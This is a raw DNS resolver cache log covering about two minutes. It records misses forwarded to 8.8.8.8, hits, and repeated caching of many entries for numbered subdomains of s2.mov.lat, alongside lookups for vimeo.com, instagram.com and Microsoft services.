+{19:32:31:592} [CACHED] Cache queue cycled with 100 new entries for f7.s2.mov.lat..
+{19:32:31:635} [CACHED] Cache queue cycled with 100 new entries for f6.s2.mov.lat..
+{19:32:31:776} [CACHED] Cache queue cycled with 100 new entries for f11.s2.mov.lat..
+{19:32:31:779} [CACHED] Cache queue cycled with 100 new entries for f10.s2.mov.lat..
+{19:32:31:783} [CACHED] Cache queue cycled with 100 new entries for f14.s2.mov.lat..
+{19:32:31:784} [CACHED] Cache queue cycled with 100 new entries for f8.s2.mov.lat..
+{19:32:31:790} [CACHED] Cache queue cycled with 100 new entries for f16.s2.mov.lat..
+{19:32:32:186} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:32:38:993} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:32:39:044} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:32:39:251} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:32:39:351} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:32:39:979} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:32:39:983} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
+{19:32:39:990} [CACHED] Cache queue cycled with 100 new entries for f7.s2.mov.lat..
+{19:32:39:991} [CACHED] Cache queue cycled with 100 new entries for f5.s2.mov.lat..
+{19:32:39:994} [CACHED] Cache queue cycled with 100 new entries for f11.s2.mov.lat..
+{19:32:40:003} [CACHED] Cache queue cycled with 100 new entries for f9.s2.mov.lat..
+{19:32:40:007} [CACHED] Cache queue cycled with 100 new entries for f12.s2.mov.lat..
+{19:32:40:013} [CACHED] Cache queue cycled with 100 new entries for f19.s2.mov.lat..
+{19:32:40:015} [CACHED] Cache queue cycled with 100 new entries for f17.s2.mov.lat..
+{19:32:40:249} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:32:40:251} [CACHED] Cache queue cycled with 100 new entries for f15.s2.mov.lat..
+{19:32:40:254} [CACHED] Cache queue cycled with 100 new entries for f6.s2.mov.lat..
+{19:32:40:257} [CACHED] Cache queue cycled with 100 new entries for f0.s2.mov.lat..
+{19:32:40:260} [CACHED] Cache queue cycled with 100 new entries for f13.s2.mov.lat..
+{19:32:40:263} [CACHED] Cache queue cycled with 100 new entries for f18.s2.mov.lat..
+{19:32:41:048} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:32:47:547} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:32:47:645} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:32:47:832} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:32:47:953} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:32:48:591} [CACHED] Cache queue cycled with 100 new entries for f5.s2.mov.lat..
+{19:32:48:596} [CACHED] Cache queue cycled with 100 new entries for f9.s2.mov.lat..
+{19:32:48:602} [CACHED] Cache queue cycled with 100 new entries for f7.s2.mov.lat..
+{19:32:48:605} [CACHED] Cache queue cycled with 100 new entries for f12.s2.mov.lat..
+{19:32:48:610} [CACHED] Cache queue cycled with 100 new entries for f8.s2.mov.lat..
+{19:32:48:839} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:32:48:842} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:32:48:849} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
+{19:32:48:852} [CACHED] Cache queue cycled with 100 new entries for f10.s2.mov.lat..
+{19:32:48:857} [CACHED] Cache queue cycled with 100 new entries for f16.s2.mov.lat..
+{19:32:48:863} [CACHED] Cache queue cycled with 100 new entries for f17.s2.mov.lat..
+{19:32:48:867} [CACHED] Cache queue cycled with 100 new entries for f15.s2.mov.lat..
+{19:32:48:868} [CACHED] Cache queue cycled with 100 new entries for f11.s2.mov.lat..
+{19:32:48:875} [CACHED] Cache queue cycled with 100 new entries for f14.s2.mov.lat..
+{19:32:48:879} [CACHED] Cache queue cycled with 100 new entries for f19.s2.mov.lat..
+{19:32:51:594} [CACHED] Cache queue cycled with 8 new entries for www.google.com..
+{19:32:56:149} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:32:56:247} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:32:56:352} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:32:56:452} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:32:57:173} [CACHED] Cache queue cycled with 100 new entries for f8.s2.mov.lat..
+{19:32:57:176} [CACHED] Cache queue cycled with 100 new entries for f16.s2.mov.lat..
+{19:32:57:183} [CACHED] Cache queue cycled with 100 new entries for f13.s2.mov.lat..
+{19:32:57:187} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:32:57:190} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
+{19:32:57:193} [CACHED] Cache queue cycled with 100 new entries for f12.s2.mov.lat..
+{19:32:57:194} [CACHED] Cache queue cycled with 100 new entries for f9.s2.mov.lat..
+{19:32:57:196} [CACHED] Cache queue cycled with 100 new entries for f6.s2.mov.lat..
+{19:32:57:201} [CACHED] Cache queue cycled with 100 new entries for f5.s2.mov.lat..
+{19:32:57:206} [CACHED] Cache queue cycled with 100 new entries for f0.s2.mov.lat..
+{19:32:57:336} [CACHED] Cache queue cycled with 100 new entries for f10.s2.mov.lat..
+{19:32:57:340} [CACHED] Cache queue cycled with 100 new entries for f7.s2.mov.lat..
+{19:32:57:344} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:32:57:345} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:32:57:355} [CACHED] Cache queue cycled with 100 new entries for f18.s2.mov.lat..
+{19:32:57:789} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:32:57:790} [CACHED] Cache queue cycled with 100 new entries for f16.s2.mov.lat..
+{19:32:58:041} [CACHED] Cache queue cycled with 100 new entries for f13.s2.mov.lat..
+{19:32:58:075} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:32:58:094} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:33:01:126} [HIT] vimeo.com. (A) found on cache
+{19:33:04:161} [HIT] vimeo.com. (A) found on cache
+{19:33:04:648} [HIT] vimeo.com. (A) found on cache
+{19:33:04:852} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:33:04:951} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:33:05:578} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:33:05:672} [CACHED] Cache queue cycled with 100 new entries for f6.s2.mov.lat..
+{19:33:05:678} [CACHED] Cache queue cycled with 100 new entries for f19.s2.mov.lat..
+{19:33:05:680} [CACHED] Cache queue cycled with 100 new entries for f8.s2.mov.lat..
+{19:33:05:683} [CACHED] Cache queue cycled with 100 new entries for f10.s2.mov.lat..
+{19:33:05:878} [CACHED] Cache queue cycled with 100 new entries for f12.s2.mov.lat..
+{19:33:05:880} [CACHED] Cache queue cycled with 100 new entries for f0.s2.mov.lat..
+{19:33:05:881} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
+{19:33:05:886} [CACHED] Cache queue cycled with 100 new entries for f7.s2.mov.lat..
+{19:33:05:893} [CACHED] Cache queue cycled with 100 new entries for f17.s2.mov.lat..
+{19:33:05:894} [CACHED] Cache queue cycled with 100 new entries for f15.s2.mov.lat..
+{19:33:05:898} [CACHED] Cache queue cycled with 100 new entries for f11.s2.mov.lat..
+{19:33:05:902} [CACHED] Cache queue cycled with 100 new entries for f9.s2.mov.lat..
+{19:33:05:903} [CACHED] Cache queue cycled with 100 new entries for f14.s2.mov.lat..
+{19:33:06:073} [CACHED] Cache queue cycled with 100 new entries for f5.s2.mov.lat..
+{19:33:06:447} [CACHED] Cache queue cycled with 100 new entries for f12.s2.mov.lat..
+{19:33:06:449} [CACHED] Cache queue cycled with 100 new entries for f7.s2.mov.lat..
+{19:33:06:460} [CACHED] Cache queue cycled with 100 new entries for f8.s2.mov.lat..
+{19:33:07:182} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:33:07:199} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:33:10:219} [HIT] vimeo.com. (A) found on cache
+{19:33:13:240} [HIT] vimeo.com. (A) found on cache
+{19:33:13:249} [HIT] vimeo.com. (A) found on cache
+{19:33:13:433} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:33:13:553} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:33:14:273} [CACHED] Cache queue cycled with 100 new entries for f0.s2.mov.lat..
+{19:33:14:275} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:33:14:278} [CACHED] Cache queue cycled with 100 new entries for f6.s2.mov.lat..
+{19:33:14:281} [CACHED] Cache queue cycled with 100 new entries for f18.s2.mov.lat..
+{19:33:14:286} [CACHED] Cache queue cycled with 100 new entries for f17.s2.mov.lat..
+{19:33:14:289} [CACHED] Cache queue cycled with 100 new entries for f10.s2.mov.lat..
+{19:33:14:290} [CACHED] Cache queue cycled with 100 new entries for f16.s2.mov.lat..
+{19:33:14:457} [CACHED] Cache queue cycled with 100 new entries for f9.s2.mov.lat..
+{19:33:14:459} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:33:14:463} [CACHED] Cache queue cycled with 100 new entries for f11.s2.mov.lat..
+{19:33:14:464} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
+{19:33:14:475} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:33:14:476} [CACHED] Cache queue cycled with 100 new entries for f13.s2.mov.lat..
+{19:33:14:479} [CACHED] Cache queue cycled with 100 new entries for f15.s2.mov.lat..
+{19:33:14:482} [CACHED] Cache queue cycled with 100 new entries for f19.s2.mov.lat..
+{19:33:15:025} [CACHED] Cache queue cycled with 100 new entries for f11.s2.mov.lat..
+{19:33:15:079} [CACHED] Cache queue cycled with 100 new entries for f0.s2.mov.lat..
+{19:33:15:459} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:33:16:259} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:33:16:281} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:33:19:300} [HIT] vimeo.com. (A) found on cache
+{19:33:21:749} [HIT] vimeo.com. (A) found on cache
+{19:33:21:953} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:33:22:052} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:33:22:321} [HIT] vimeo.com. (A) found on cache
+{19:33:22:775} [CACHED] Cache queue cycled with 100 new entries for f9.s2.mov.lat..
+{19:33:22:776} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:33:22:778} [CACHED] Cache queue cycled with 100 new entries for f12.s2.mov.lat..
+{19:33:22:783} [CACHED] Cache queue cycled with 100 new entries for f10.s2.mov.lat..
+{19:33:22:784} [CACHED] Cache queue cycled with 100 new entries for f17.s2.mov.lat..
+{19:33:22:791} [CACHED] Cache queue cycled with 100 new entries for f14.s2.mov.lat..
+{19:33:22:796} [CACHED] Cache queue cycled with 100 new entries for f13.s2.mov.lat..
+{19:33:22:977} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:33:22:980} [CACHED] Cache queue cycled with 100 new entries for f5.s2.mov.lat..
+{19:33:22:986} [CACHED] Cache queue cycled with 100 new entries for f7.s2.mov.lat..
+{19:33:22:989} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
+{19:33:22:991} [CACHED] Cache queue cycled with 100 new entries for f6.s2.mov.lat..
+{19:33:22:993} [CACHED] Cache queue cycled with 100 new entries for f16.s2.mov.lat..
+{19:33:22:998} [CACHED] Cache queue cycled with 100 new entries for f18.s2.mov.lat..
+{19:33:23:182} [CACHED] Cache queue cycled with 100 new entries for f8.s2.mov.lat..
+{19:33:23:639} [CACHED] Cache queue cycled with 100 new entries for f9.s2.mov.lat..
+{19:33:25:341} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:33:25:367} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:33:28:387} [HIT] vimeo.com. (A) found on cache
+{19:33:30:242} [HIT] vimeo.com. (A) found on cache
+{19:33:31:409} [HIT] vimeo.com. (A) found on cache
+{19:33:32:246} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:33:32:291} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:33:33:013} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:33:33:014} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:33:33:017} [CACHED] Cache queue cycled with 100 new entries for f11.s2.mov.lat..
+{19:33:33:023} [CACHED] Cache queue cycled with 100 new entries for f19.s2.mov.lat..
+{19:33:33:027} [CACHED] Cache queue cycled with 100 new entries for f12.s2.mov.lat..
+{19:33:33:028} [CACHED] Cache queue cycled with 100 new entries for f17.s2.mov.lat..
+{19:33:33:032} [CACHED] Cache queue cycled with 100 new entries for f13.s2.mov.lat..
+{19:33:33:034} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:33:33:037} [CACHED] Cache queue cycled with 100 new entries for f10.s2.mov.lat..
+{19:33:33:218} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
+{19:33:33:222} [CACHED] Cache queue cycled with 100 new entries for f15.s2.mov.lat..
+{19:33:33:223} [CACHED] Cache queue cycled with 100 new entries for f0.s2.mov.lat..
+{19:33:33:230} [CACHED] Cache queue cycled with 100 new entries for f7.s2.mov.lat..
+{19:33:33:236} [CACHED] Cache queue cycled with 100 new entries for f14.s2.mov.lat..
+{19:33:33:237} [CACHED] Cache queue cycled with 100 new entries for f5.s2.mov.lat..
+{19:33:33:575} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:33:33:824} [CACHED] Cache queue cycled with 100 new entries for f11.s2.mov.lat..
+{19:33:33:827} [CACHED] Cache queue cycled with 100 new entries for f19.s2.mov.lat..
+{19:33:33:953} [CACHED] Cache queue cycled with 16 new entries for android.clients.google.com..
+{19:33:34:429} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:33:34:447} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:33:37:467} [HIT] vimeo.com. (A) found on cache
+{19:33:40:438} [HIT] vimeo.com. (A) found on cache
+{19:33:40:484} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:33:40:488} [HIT] vimeo.com. (A) found on cache
+{19:33:40:502} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:33:41:125} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:33:41:129} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
+{19:33:41:142} [CACHED] Cache queue cycled with 100 new entries for f9.s2.mov.lat..
+{19:33:41:146} [CACHED] Cache queue cycled with 100 new entries for f8.s2.mov.lat..
+{19:33:41:150} [CACHED] Cache queue cycled with 100 new entries for f10.s2.mov.lat..
+{19:33:41:156} [CACHED] Cache queue cycled with 100 new entries for f7.s2.mov.lat..
+{19:33:41:162} [CACHED] Cache queue cycled with 100 new entries for f18.s2.mov.lat..
+{19:33:41:371} [CACHED] Cache queue cycled with 100 new entries for f0.s2.mov.lat..
+{19:33:41:380} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:33:41:385} [CACHED] Cache queue cycled with 100 new entries for f6.s2.mov.lat..
+{19:33:41:391} [CACHED] Cache queue cycled with 100 new entries for f15.s2.mov.lat..
+{19:33:41:400} [CACHED] Cache queue cycled with 100 new entries for f12.s2.mov.lat..
+{19:33:41:403} [CACHED] Cache queue cycled with 100 new entries for f13.s2.mov.lat..
+{19:33:41:407} [CACHED] Cache queue cycled with 100 new entries for f16.s2.mov.lat..
+{19:33:41:412} [CACHED] Cache queue cycled with 100 new entries for f17.s2.mov.lat..
+{19:33:43:520} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:33:43:542} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:33:48:755} [HIT] vimeo.com. (A) found on cache
+{19:33:48:801} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:33:48:828} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:33:49:449} [CACHED] Cache queue cycled with 100 new entries for f0.s2.mov.lat..
+{19:33:49:453} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:33:49:459} [CACHED] Cache queue cycled with 100 new entries for f7.s2.mov.lat..
+{19:33:49:465} [CACHED] Cache queue cycled with 100 new entries for f8.s2.mov.lat..
+{19:33:49:469} [CACHED] Cache queue cycled with 100 new entries for f5.s2.mov.lat..
+{19:33:49:487} [CACHED] Cache queue cycled with 100 new entries for f19.s2.mov.lat..
+{19:33:49:506} [CACHED] Cache queue cycled with 0 new entries for f5.s2.mov.lat..
+{19:33:49:693} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:33:49:698} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:33:49:703} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
+{19:33:49:707} [CACHED] Cache queue cycled with 100 new entries for f10.s2.mov.lat..
+{19:33:49:713} [CACHED] Cache queue cycled with 100 new entries for f6.s2.mov.lat..
+{19:33:49:715} [CACHED] Cache queue cycled with 100 new entries for f11.s2.mov.lat..
+{19:33:49:722} [CACHED] Cache queue cycled with 100 new entries for f9.s2.mov.lat..
+{19:33:49:736} [CACHED] Cache queue cycled with 100 new entries for f14.s2.mov.lat..
+{19:33:49:737} [CACHED] Cache queue cycled with 100 new entries for f18.s2.mov.lat..
+{19:33:51:647} [CACHED] Cache queue cycled with 8 new entries for www.google.com..
+{19:33:54:473} [CACHED] Cache queue cycled with 1 new entries for main.vscode-cdn.net..
+{19:33:55:635} [CACHED] Cache queue cycled with 1 new entries for vscode-sync.trafficmanager.net..
+{19:33:56:661} [CACHED] Cache queue cycled with 1 new entries for westus-0.in.applicationinsights.azure.com..
+{19:33:56:976} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:33:56:992} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:33:57:046} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:33:57:072} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:33:57:704} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:33:57:707} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:33:57:728} [CACHED] Cache queue cycled with 100 new entries for f16.s2.mov.lat..
+{19:33:57:738} [CACHED] Cache queue cycled with 100 new entries for f17.s2.mov.lat..
+{19:33:57:942} [CACHED] Cache queue cycled with 100 new entries for f0.s2.mov.lat..
+{19:33:57:947} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:33:57:963} [CACHED] Cache queue cycled with 100 new entries for f8.s2.mov.lat..
+{19:33:57:967} [CACHED] Cache queue cycled with 100 new entries for f7.s2.mov.lat..
+{19:33:57:970} [CACHED] Cache queue cycled with 100 new entries for f5.s2.mov.lat..
+{19:33:57:972} [CACHED] Cache queue cycled with 100 new entries for f10.s2.mov.lat..
+{19:33:57:977} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
+{19:33:57:982} [CACHED] Cache queue cycled with 100 new entries for f13.s2.mov.lat..
+{19:33:57:984} [CACHED] Cache queue cycled with 100 new entries for f15.s2.mov.lat..
+{19:33:57:988} [CACHED] Cache queue cycled with 100 new entries for f12.s2.mov.lat..
+{19:33:57:993} [CACHED] Cache queue cycled with 100 new entries for f19.s2.mov.lat..
+{19:33:58:762} [CACHED] Cache queue cycled with 100 new entries for f7.s2.mov.lat..
+{19:34:05:217} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:34:05:241} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:34:05:285} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:34:05:304} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:34:05:987} [CACHED] Cache queue cycled with 100 new entries for f6.s2.mov.lat..
+{19:34:05:990} [CACHED] Cache queue cycled with 100 new entries for f16.s2.mov.lat..
+{19:34:05:993} [CACHED] Cache queue cycled with 100 new entries for f10.s2.mov.lat..
+{19:34:05:995} [CACHED] Cache queue cycled with 100 new entries for f9.s2.mov.lat..
+{19:34:05:996} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:34:06:003} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:34:06:006} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
+{19:34:06:009} [CACHED] Cache queue cycled with 100 new entries for f17.s2.mov.lat..
+{19:34:06:011} [CACHED] Cache queue cycled with 100 new entries for f5.s2.mov.lat..
+{19:34:06:013} [CACHED] Cache queue cycled with 100 new entries for f11.s2.mov.lat..
+{19:34:06:190} [CACHED] Cache queue cycled with 100 new entries for f0.s2.mov.lat..
+{19:34:06:193} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:34:06:198} [CACHED] Cache queue cycled with 100 new entries for f8.s2.mov.lat..
+{19:34:06:217} [CACHED] Cache queue cycled with 100 new entries for f18.s2.mov.lat..
+{19:34:06:220} [CACHED] Cache queue cycled with 100 new entries for f14.s2.mov.lat..
+{19:34:06:601} [CACHED] Cache queue cycled with 100 new entries for f6.s2.mov.lat..
+{19:34:06:602} [CACHED] Cache queue cycled with 100 new entries for f10.s2.mov.lat..
+{19:34:06:804} [CACHED] Cache queue cycled with 100 new entries for f9.s2.mov.lat..
+{19:34:06:807} [CACHED] Cache queue cycled with 100 new entries for f16.s2.mov.lat..
+{19:34:09:345} [CACHED] Cache queue cycled with 1 new entries for mobile.events.data.microsoft.com..
+{19:34:13:453} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:34:13:473} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:34:13:519} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:34:13:540} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:34:14:163} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:34:14:165} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:34:14:171} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
+{19:34:14:174} [CACHED] Cache queue cycled with 100 new entries for f7.s2.mov.lat..
+{19:34:14:196} [CACHED] Cache queue cycled with 100 new entries for f15.s2.mov.lat..
+{19:34:14:199} [CACHED] Cache queue cycled with 100 new entries for f18.s2.mov.lat..
+{19:34:14:405} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:34:14:412} [CACHED] Cache queue cycled with 100 new entries for f11.s2.mov.lat..
+{19:34:14:413} [CACHED] Cache queue cycled with 100 new entries for f0.s2.mov.lat..
+{19:34:14:426} [CACHED] Cache queue cycled with 100 new entries for f5.s2.mov.lat..
+{19:34:14:434} [CACHED] Cache queue cycled with 100 new entries for f8.s2.mov.lat..
+{19:34:14:443} [CACHED] Cache queue cycled with 100 new entries for f12.s2.mov.lat..
+{19:34:14:445} [CACHED] Cache queue cycled with 100 new entries for f13.s2.mov.lat..
+{19:34:14:450} [CACHED] Cache queue cycled with 100 new entries for f19.s2.mov.lat..
+{19:34:14:642} [CACHED] Cache queue cycled with 100 new entries for f17.s2.mov.lat..
+{19:34:16:092} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:34:16:122} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:34:19:154} [HIT] instagram.com. (A) found on cache
+{19:34:21:688} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:34:21:707} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:34:21:757} [HIT] instagram.com. (A) found on cache
+{19:34:22:178} [HIT] instagram.com. (A) found on cache
+{19:34:22:380} [CACHED] Cache queue cycled with 100 new entries for f0.s2.mov.lat..
+{19:34:22:384} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:34:22:387} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:34:22:393} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:34:22:396} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
+{19:34:22:403} [CACHED] Cache queue cycled with 100 new entries for f7.s2.mov.lat..
+{19:34:22:406} [CACHED] Cache queue cycled with 100 new entries for f9.s2.mov.lat..
+{19:34:22:412} [CACHED] Cache queue cycled with 100 new entries for f11.s2.mov.lat..
+{19:34:22:417} [CACHED] Cache queue cycled with 100 new entries for f14.s2.mov.lat..
+{19:34:22:422} [CACHED] Cache queue cycled with 100 new entries for f15.s2.mov.lat..
+{19:34:22:625} [CACHED] Cache queue cycled with 100 new entries for f16.s2.mov.lat..
+{19:34:22:630} [CACHED] Cache queue cycled with 100 new entries for f18.s2.mov.lat..
+{19:34:22:637} [CACHED] Cache queue cycled with 100 new entries for f6.s2.mov.lat..
+{19:34:22:640} [CACHED] Cache queue cycled with 100 new entries for f5.s2.mov.lat..
+{19:34:22:647} [CACHED] Cache queue cycled with 100 new entries for f10.s2.mov.lat..
+{19:34:25:198} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:34:25:225} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:34:28:245} [HIT] instagram.com. (A) found on cache
+{19:34:29:945} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:34:30:046} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:34:30:254} [HIT] instagram.com. (A) found on cache
+{19:34:30:972} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:34:30:975} [CACHED] Cache queue cycled with 100 new entries for f0.s2.mov.lat..
+{19:34:30:978} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
+{19:34:30:981} [CACHED] Cache queue cycled with 100 new entries for f13.s2.mov.lat..
+{19:34:30:984} [CACHED] Cache queue cycled with 100 new entries for f12.s2.mov.lat..
+{19:34:30:989} [CACHED] Cache queue cycled with 100 new entries for f15.s2.mov.lat..
+{19:34:30:991} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:34:30:996} [CACHED] Cache queue cycled with 100 new entries for f17.s2.mov.lat..
+{19:34:31:179} [CACHED] Cache queue cycled with 100 new entries for f7.s2.mov.lat..
+{19:34:31:181} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:34:31:182} [CACHED] Cache queue cycled with 100 new entries for f14.s2.mov.lat..
+{19:34:31:188} [CACHED] Cache queue cycled with 100 new entries for f9.s2.mov.lat..
+{19:34:31:189} [CACHED] Cache queue cycled with 100 new entries for f8.s2.mov.lat..
+{19:34:31:264} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:34:31:286} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:34:31:382} [CACHED] Cache queue cycled with 100 new entries for f11.s2.mov.lat..
+{19:34:31:385} [CACHED] Cache queue cycled with 100 new entries for f19.s2.mov.lat..
+{19:34:31:839} [CACHED] Cache queue cycled with 100 new entries for f0.s2.mov.lat..
+{19:34:34:306} [HIT] instagram.com. (A) found on cache
+{19:34:37:327} [HIT] instagram.com. (A) found on cache
+{19:34:38:549} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:34:38:648} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:34:38:856} [HIT] instagram.com. (A) found on cache
+{19:34:39:575} [CACHED] Cache queue cycled with 100 new entries for f5.s2.mov.lat..
+{19:34:39:577} [CACHED] Cache queue cycled with 100 new entries for f13.s2.mov.lat..
+{19:34:39:582} [CACHED] Cache queue cycled with 100 new entries for f7.s2.mov.lat..
+{19:34:39:782} [CACHED] Cache queue cycled with 100 new entries for f6.s2.mov.lat..
+{19:34:39:783} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:34:39:786} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:34:39:788} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
+{19:34:39:790} [CACHED] Cache queue cycled with 100 new entries for f14.s2.mov.lat..
+{19:34:39:795} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:34:39:801} [CACHED] Cache queue cycled with 100 new entries for f12.s2.mov.lat..
+{19:34:39:802} [CACHED] Cache queue cycled with 100 new entries for f16.s2.mov.lat..
+{19:34:39:806} [CACHED] Cache queue cycled with 100 new entries for f15.s2.mov.lat..
+{19:34:39:807} [CACHED] Cache queue cycled with 100 new entries for f10.s2.mov.lat..
+{19:34:39:809} [CACHED] Cache queue cycled with 100 new entries for f18.s2.mov.lat..
+{19:34:39:899} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:34:39:983} [CACHED] Cache queue cycled with 100 new entries for f17.s2.mov.lat..
+{19:34:40:347} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:34:40:377} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:34:40:403} [CACHED] Cache queue cycled with 100 new entries for f14.s2.mov.lat..
+{19:34:40:581} [CACHED] Cache queue cycled with 100 new entries for f4.s2.mov.lat..
